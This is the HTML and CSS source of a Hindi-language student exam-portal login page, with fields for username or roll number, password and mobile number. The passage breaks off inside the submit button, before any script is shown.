<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>स्टूडेंट लॉगिन</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: #f4f4f4;
    }
    .header {
      background: #003087;
      color: white;
      text-align: center;
      padding: 15px;
    }
    .header h2 {
      margin: 0;
      font-size: 1.8em;
    }
    .container {
      max-width: 420px;
      margin: 40px auto;
      padding: 30px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 12px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #d32f2f;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 10px;
    }
    button:hover {
      background: #b71c1c;
    }
    .info {
      text-align: center;
      color: #555;
      margin-top: 15px;
      font-size: 0.9em;
    }
  </style>
</head>
<body>

<div class="header">
  <h2>एग्जाम पोर्टल लॉगिन</h2>
</div>

<div class="container">
  <form id="loginForm">
    <input type="text" id="username" placeholder="Username / Roll No" required autocomplete="off">
    <input type="password" id="password" placeholder="Password" required autocomplete="off">
    <input type="tel" id="mobile" placeholder="Mobile Number (10 अंक)" pattern="[0-9]{10}" required autocomplete="off">
    <button type="submit">लॉग
